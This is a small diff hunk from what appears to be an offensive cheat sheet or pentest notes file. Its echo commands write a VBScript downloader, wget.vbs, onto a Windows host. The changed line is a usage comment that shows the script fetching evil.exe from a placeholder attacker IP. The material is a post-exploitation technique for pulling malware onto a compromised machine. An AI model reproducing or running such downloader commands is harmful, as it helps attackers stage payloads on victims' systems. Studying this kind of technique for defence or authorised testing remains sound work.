@@ -24,4 +24,4 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
-// using the script looks something like this: cscript wget.vbs http://attackerip/evil.exe evil.exe
+' using the script looks something like this: cscript wget.vbs http://attackerip/evil.exe evil.exe
